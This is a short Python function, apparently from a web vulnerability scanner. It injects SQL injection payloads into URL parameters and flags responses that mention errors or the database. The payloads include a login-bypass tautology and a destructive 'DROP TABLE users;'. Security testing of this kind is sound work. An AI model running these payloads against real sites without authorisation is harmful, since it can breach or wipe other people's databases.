import requests

# Load payloads for SQL injection (replace with actual file loading mechanism)
sqli_payloads = ['1\' OR \'1\'=\'1', 'DROP TABLE users;']

# Function to test SQL Injection vulnerabilities
def test_sql_injection(url, input_fields):
    print(f"Testing for SQL Injection on {url}")
    vulnerable_params = []
    for field in input_fields:
        name = field[2]
        for payload in sqli_payloads:
            test_url = f"{url}?{name}={payload}"
            try:
                response = requests.get(test_url)
                if "error" in response.text or "warning" in response.text or "database" in response.text:
                    print(f"Potential SQL Injection vulnerability detected in parameter: {name} with payload: {payload}")
                    vulnerable_params.append((name, payload))
            except Exception as e:
                print(f"Error testing SQL Injection on parameter: {name} - {e}")
    return vulnerable_params
